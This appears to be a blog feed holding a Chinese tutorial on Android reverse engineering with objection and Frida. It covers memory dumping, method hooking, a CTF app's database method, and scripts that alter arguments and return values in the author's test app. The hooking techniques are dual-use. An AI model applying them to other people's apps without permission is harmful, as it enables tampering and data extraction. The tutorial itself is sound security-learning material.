<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>v5le0n9&#39;s garden</title>
  
  <subtitle>小凉的秘密基地</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-08-17T15:14:54.239Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>v5le0n9</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Frida逆向与利用自动化</title>
    <link href="http://example.com/posts/ab7319a3.html"/>
    <id>http://example.com/posts/ab7319a3.html</id>
    <published>2022-08-15T12:29:33.258Z</published>
    <updated>2022-08-17T15:14:54.239Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章记录一下objection和frida的使用方法，相当于操作手册。</p><span id="more"></span><h1 id="1-objection"><a href="#1-objection" class="headerlink" title="1. objection"></a>1. objection</h1><p>objection功能强大，命令众多，而且不用写一行代码，便可实现诸如内存搜索、类和模块搜索、方法hook打印参数返回值调用栈等常用功能，是一个非常方便的，逆向必备、内存漫游神器。</p><img src="/posts/ab7319a3/1.1.1.png" class="" title="objection界面"><p>下面以安卓内置应用“设置”为例，示范一下objection的基本用法。</p><p>运行“设置”App，启动frida-server。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# adb shell                                                         </span><br><span class="line">bullhead:/ $ su -</span><br><span class="line">bullhead:/ # cd /data/local/tmp</span><br><span class="line">bullhead:/data/local/tmp # ./frida-server-12.8.0-android-arm64  </span><br></pre></td></tr></table></figure><p>查看“设置”应用的包名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# frida-ps -U|grep -i setting</span><br><span class="line">5649  com.android.settings</span><br></pre></td></tr></table></figure><p>再使用objection注入“设置”应用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.android.settings explore</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.1.2.png" class="" title="objection界面"><h2 id="1-1-获取基本信息"><a href="#1-1-获取基本信息" class="headerlink" title="1.1 获取基本信息"></a>1.1 获取基本信息</h2><p>启动objection之后，会出现提示它的logo，这时候不知道输入什么命令的话，可以按下空格，有提示的命令及其功能出来；再按空格选中，又会有新的提示命令出来，这时候按回车就可以执行该命令。</p><p>如果不知道当前命令的效果是什么，在当前命令前加help，比如help env，回车之后会出现当前命令的解释信息。</p><img src="/posts/ab7319a3/1.1.3.png" class="" title="helpenv"><p>objection还有一个jobs(作业系统)，建议一定要掌握，可以同时运行多项(hook)作业。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">com.android.settings on (google: 8.1.0) [usb] # jobs list                      </span><br><span class="line">Job ID  Hooks  Type</span><br><span class="line">------  -----  ----</span><br></pre></td></tr></table></figure><h2 id="1-2-提取内存信息"><a href="#1-2-提取内存信息" class="headerlink" title="1.2 提取内存信息"></a>1.2 提取内存信息</h2><p>查看内存中加载的库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory list modules</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.1.4.png" class="" title="查看内存中加载的库"><p>查看库中的导出函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory list exports libssl.so</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.2.1.png" class="" title="查看库中的导出函数"><p>如果输出结果太多，终端无法全部显示的时候，可以将结果导出到文件中，然后使用其他软件查看内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory list exports libart.so --json /root/libart.json</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.2.2.png" class="" title="导出到文件"><p>提取整个(或部分)内存到当前目录的from_base文件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory dump all from_base</span><br></pre></td></tr></table></figure><p>搜索整个内存：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memory search --string --offsets-only</span><br></pre></td></tr></table></figure><h2 id="1-3-内存堆搜索与执行"><a href="#1-3-内存堆搜索与执行" class="headerlink" title="1.3 内存堆搜索与执行"></a>1.3 内存堆搜索与执行</h2><p>我们查看AOSP源码关于设置里显示系统设置的部分，发现存在着DisplaySettings类，可以在堆上搜索是否存在着该类的实例。首先在手机上点击进入“显示”设置，然后运行以下命令，并得到相应的实例地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android heap search instances com.android.settings.DisplaySettings</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.2.3.png" class="" title="在堆上搜索实例"><p>查看源码得知com.android.settings.DisplaySettings类有着<code>getPreferenceScreenResId()</code>方法，这样就可以直接调用该实例的<code>getPreferenceScreenResId()</code>方法，用excute命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android heap execute 0x22a2 getPreferenceScreenResId</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.3.1.png" class="" title="调用实例的方法"><p>也可以在找到的实例上直接编写js脚本，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android heap evaluate 0x22a2</span><br></pre></td></tr></table></figure><p>命令后，会进入一个迷你编辑器环境，输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(&quot;evaluate result:&quot;+clazz.getPreferenceScreenResId())</span><br></pre></td></tr></table></figure><p>这串脚本，按ESC退出编辑器，然后按回车，即会开始执行这串脚本，输出结果。</p><img src="/posts/ab7319a3/1.3.2.png" class="" title="调用实例的方法"><p>这个功能非常厉害，可以即时编写、出结果、即时调试自己的代码，不用再编写→注入→操作→看结果→再调整，而是直接出结果。</p><h2 id="1-4-启动activity或service"><a href="#1-4-启动activity或service" class="headerlink" title="1.4 启动activity或service"></a>1.4 启动activity或service</h2><p>直接某个启动activity：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android intent launch_activity com.android.settings.DisplaySettings </span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.3.3.png" class="" title="启动activity"><p>查看当前可用的activity：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking list activities</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.4.1.png" class="" title="查看当前可用的activity"><p>启动service：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android intent launch_service com.android.settings.bluetooth.BluetoothPairingService</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.4.2.png" class="" title="启动service"><h2 id="1-5-内存漫游"><a href="#1-5-内存漫游" class="headerlink" title="1.5 内存漫游"></a>1.5 内存漫游</h2><p>列出内存中所有的类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking list classes</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.4.3.png" class="" title="列出内存中所有的类"><p>在内存中所有已加载的类中搜索包含特定关键词的类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes display</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.1.png" class="" title="在内存中所有已加载的类中搜索包含特定关键词的类"><p>在内存中所有已加载的类的方法中搜索包含特定关键词的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search methods display</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.2.png" class="" title="在内存中所有已加载的类的方法中搜索包含特定关键词的方法"><p>列出指定类的所有方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking list class_methods com.android.settings.DisplaySettings</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.3.png" class="" title="列出指定类的所有方法"><p>在列出类的方法时，还直接把参数也提供了，也就是说我们可以直接动手写hook了，既然上述写hook的要素已经全部都有了，objection这个“自动化”工具，当然可以直接生成代码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking generate  simple  com.android.settings.DisplaySettings</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.4.png" class="" title="直接生成代码"><p>生成的代码大部分要素都有了，只是参数貌似没有填上，还是需要我们后续补充一些，看来还是无法做到完美。</p><h2 id="1-6-hook"><a href="#1-6-hook" class="headerlink" title="1.6 hook"></a>1.6 hook</h2><p>上述操作均是基于在内存中直接枚举搜索，已经可以获取到大量有用的静态信息，我们再来介绍几个方法，可以获取到执行时动态的信息。</p><p>我们以手机连接蓝牙耳机播放音乐为例为例，看看手机蓝牙接口的动态信息。</p><p>首先我们将手机连接上我的蓝牙耳机，并可以正常播放音乐；然后我们按照上文的方法，搜索一下与蓝牙相关的类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes bluetooth</span><br></pre></td></tr></table></figure><p>搜到一个高度可疑的类：android.bluetooth.BluetoothDevice。运行以下命令，hook这个类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class android.bluetooth.BluetoothDevice</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.6.png" class="" title="hook类"><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jobs list</span><br></pre></td></tr></table></figure><p>可以看到objection为我们创建的hooks数为55，也就是将android.bluetooth.BluetoothDevice类下的所有方法都hook了。</p><img src="/posts/ab7319a3/1.5.5.png" class="" title="hook方法"><p>这时候我们在“声音”或者“蓝牙”上进行操作，会命中这些hook，此时objection就会将方法打印出来，会将类似这样的信息“吐”出来：</p><img src="/posts/ab7319a3/1.5.7.png" class="" title="hook信息"><p>在这些方法中，我们对哪些方法感兴趣，就可以查看哪些方法的参数、返回值和调用栈，比如想看<code>getName()</code>方法，则运行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method android.bluetooth.BluetoothDevice.getName --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.8.png" class="" title="hook信息"><p>注意最后加上的三个选项—dump-args —dump-return —dump-backtrace，为我们成功打印出来了我们想要看的信息，其实返回值Return Value就是getName()方法的返回值，我的蓝牙耳机的型号名字M200 Pro。</p><p>再来看个有参数的，比如<code>equals()</code>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method android.bluetooth.BluetoothDevice.equals --dump-args --dump-return --dump-backtrace</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.5.9.png" class="" title="hook信息"><p>objection的help中指出，在hook给出的单个方法的时候，会hook它的所有重载。那我们可以用File类的构造器来试一下效果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method java.io.File.$init --dump-args</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.6.1.png" class="" title="hook信息"><p>可以看到objection为我们hook了File构造器的所有重载，一共是6个。在设置界面随意进出几个子设置界面，可以看到命中很多次该方法的不同重载，每次参数的值也都不同。</p><p>有些类和方法在App启动时就加载完毕了，这时如何hook这些类和方法呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g &lt;packagename&gt; explore --startup-command &#x27;android hooking watch ......&#x27;</span><br></pre></td></tr></table></figure><p>或者用上面的方法，它既然被调用过了，那它肯定在内存堆中，搜索并且主动执行该类或方法。</p><p>另外，objection无法hook so函数。</p><h2 id="1-7-插件"><a href="#1-7-插件" class="headerlink" title="1.7 插件"></a>1.7 插件</h2><p>有很多小工具支持作为objection插件来使用，比如Wallbreaker、frida-dexdump等。</p><h3 id="1-7-1-Wallbreaker"><a href="#1-7-1-Wallbreaker" class="headerlink" title="1.7.1 Wallbreaker"></a>1.7.1 Wallbreaker</h3><p>加载Wallbreaker插件，load后面跟插件所在路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin load ~/.objection/plugins/Wallbreaker</span><br></pre></td></tr></table></figure><p> Wallbreaker搜索类，根据给的 pattern 对所有类名进行匹配，列出匹配到的所有类名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker classsearch &lt;pattern&gt;</span><br></pre></td></tr></table></figure><p>搜索对象，根据类名搜索内存中已经被创建的实例，列出 handle 和 toString() 的结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker objectsearch &lt;classname&gt;</span><br></pre></td></tr></table></figure><p>ClassDump，输出类的结构， 若加了 —fullname 参数，打印的数据中类名会带着完整的包名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker classdump &lt;classname&gt; [--fullname]</span><br></pre></td></tr></table></figure><p>ObjectDump，在 ClassDump 的基础上，输出指定对象中的每个字段的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plugin wallbreaker objectdump &lt;handle&gt; [--fullname]</span><br></pre></td></tr></table></figure><h2 id="1-8-例子"><a href="#1-8-例子" class="headerlink" title="1.8 例子"></a>1.8 例子</h2><p>可用上次做过的例子<a href="https://v5le0n9.github.io/posts/9f62af2.html#3-app3">攻防世界Mobile app3</a>，这次用另一种方法，利用frida hook解题。</p><p>可知下图是解题的关键，如何把<code>getWritableDatabase()</code>方法的返回值hook出来呢？</p><img src="/posts/ab7319a3/1.8.1.png" class="" title="反编译源码"><p>由于调用它的<code>a()</code>方法在App启动时就加载了，并且后面的操作再也没有使用过它，所以我们要在App启动前hook<code>getWritableDatabase()</code>。</p><p>首先运行frida-server，注入objection：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.example.yaphetshan.tencentwelcome explore </span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.8.2.png" class="" title="连接模拟器"><p>一个App中有很多个类，因为不仅有自定义的，还有系统自带的，所以我们可以搜索App包名下有哪些类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search classes com.example.yaphetshan.tencentwelcome</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.8.8.png" class="" title="搜索包名下的类"><p>接着可以将某个类中的所有方法列举出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking list class_methods com.example.yaphetshan.tencentwelcome.a</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.8.9.png" class="" title="列举类中的方法"><p>回归正题。要hook一个方法，首先要知道它所在的包名、类名与方法名。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking search methods getWritableDatabase</span><br></pre></td></tr></table></figure><p>呃…我用上面这个进行搜索没找到，是因为我用了Android 4.4。Android 5.1又可以了。</p><img src="/posts/ab7319a3/1.8.6.png" class="" title="查找方法所在"><p>也可以看从jadx中查看<code>getWritableDatabase()</code>的定义，就可以知道它从哪里来的，但静态反编译不一定准确。</p><img src="/posts/ab7319a3/1.8.3.png" class="" title="方法"><p>hook这个方法可以用以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase --dump-args --dump-backtrace --dump-return </span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.8.4.png" class="" title="hook方法"><p>虽然我们成功hook了，但是无论我们怎么运行都不会命中它，因为它只有在启动时才会被加载。所以我们需要在App启动前就hook。将模拟器中的程序完全退出，执行命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g com.example.yaphetshan.tencentwelcome explore --startup-command &#x27;android hooking watch class_method net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase --dump-args --dump-backtrace --dump-return&#x27;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.8.5.png" class="" title="hook部分成功"><p>有个警告说某些hook失败，马上换Android 5。hook成功了，但是在App启动过程中没有命中该方法。</p><img src="/posts/ab7319a3/1.8.7.png" class="" title="hook成功但没命中"><p>用另一种方法，先hook好<code>getWritableDatabase()</code>方法，再利用内存堆搜索MainActivity类的句柄，进而主动执行该类的<code>a()</code>方法。因为MainActivity类中的<code>a()</code>方法调用了<code>getWritableDatabase()</code>方法，所以按理说是可以命中的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">android hooking watch class_method net.sqlcipher.database.SQLiteOpenHelper.getWritableDatabase --dump-args --dump-backtrace --dump-return</span><br><span class="line">android heap search instances com.example.yaphetshan.tencentwelcome.MainActivity</span><br><span class="line">android heap execute 0x20043e a</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/1.8.10.png" class="" title="命中"><h1 id="2-frida"><a href="#2-frida" class="headerlink" title="2. frida"></a>2. frida</h1><p>在AS中创建一个Empty Activity，直接运行安装在手机上。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.v5le0n9.test01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.1.png" class="" title="简单的APK程序"><p>现在我们可以在代码中添加一点东西，让它每隔1s在LogCat中输出加法运算的结果：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//MainActivity.java</span></span><br><span class="line"><span class="keyword">package</span> com.v5le0n9.test01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> fun(<span class="number">50</span>,<span class="number">100</span>);</span><br><span class="line">            Log.d(<span class="string">&quot;l30n9ry0n2&quot;</span>, String.valueOf(m));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="title function_">fun</span> <span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;l30n9ry0n1&quot;</span>, String.valueOf(x+y));</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.2.png" class="" title="简单加法"><p>接下来可以编写js代码将App在LogCat中的结果打印出来：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(args1, args2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>启动frida-server，执行js代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U com.v5le0n9.test01 -l test01.js </span><br></pre></td></tr></table></figure><ul><li>-U：连接到USB设备</li><li>-l：载入脚本</li></ul><img src="/posts/ab7319a3/2.1.3.png" class="" title="hook"><h2 id="2-1-修改参数"><a href="#2-1-修改参数" class="headerlink" title="2.1 修改参数"></a>2.1 修改参数</h2><p>修改传入的参数，返回值的结果也随之改变：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(<span class="number">20</span>, <span class="number">90</span>)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.5.png" class="" title="修改传入的参数"><img src="/posts/ab7319a3/2.1.6.png" class="" title="修改传入的参数"><h2 id="2-2-修改返回值"><a href="#2-2-修改返回值" class="headerlink" title="2.2 修改返回值"></a>2.2 修改返回值</h2><p>直接修改返回值结果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test01.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(args1, args2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;args1, args2, result&quot;</span>, args1, args2, result)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">80</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><img src="/posts/ab7319a3/2.1.4.png" class="" title="修改返回值"><h2 id="2-3-查找调用栈"><a href="#2-3-查找调用栈" class="headerlink" title="2.3 查找调用栈"></a>2.3 查找调用栈</h2><p>调用栈，可以查看函数是从哪里来的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.v5le0n9.test01.MainActivity&quot;</span>).<span class="property">fun</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">args1, args2</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">fun</span>(args1, args2)</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.util.Log&quot;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Throwable&quot;</span>).$new()))</span><br><span class="line">            <span class="variable language_">console</span>.<span 